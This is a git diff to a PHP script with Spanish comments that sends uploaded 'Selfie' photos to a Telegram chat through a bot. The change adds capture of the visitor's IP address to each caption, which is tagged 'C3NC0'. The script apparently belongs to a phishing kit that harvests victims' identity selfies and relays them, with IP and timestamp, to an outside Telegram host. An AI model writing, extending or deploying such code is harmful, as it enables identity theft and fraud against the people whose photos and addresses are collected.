@@ -8,6 +8,24 @@ session_start();
 header('Content-Type: application/json');
 include 'bot.php';
 
+    // Función para obtener la IP real del usuario
+    function getRealIpAddr() {
+        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+            $ip = $_SERVER['HTTP_CLIENT_IP'];
+        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+            if (strpos($ip, ',') !== false) {
+                $ips = explode(',', $ip);
+                $ip = trim($ips[0]);
+            }
+        } else {
+            $ip = $_SERVER['REMOTE_ADDR'];
+        }
+        return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : '127.0.0.1';
+    }
+
+    $ip = getRealIpAddr();
+
 // Función para enviar respuesta JSON
 function sendResponse($success, $message, $data = null) {
     // Limpiar cualquier output anterior
@@ -84,7 +102,7 @@ function sendPhotoToTelegram($botToken, $chatId, $photoPath, $caption = '', $use
     $postData = [
         'chat_id' => $chatId,
         'photo' => new CURLFile(realpath($photoPath)),
-        'caption' => "🔐 C3NC0 |\n\n📸 Selfie: {$caption}\n⏰ Fecha: " . date('d/m/Y H:i:s')
+        'caption' => "🔐 C3NC0 | {$ip}\n\n📸 Selfie: {$caption}\n⏰ Fecha: " . date('d/m/Y H:i:s')
     ];
     
     // Configurar cURL
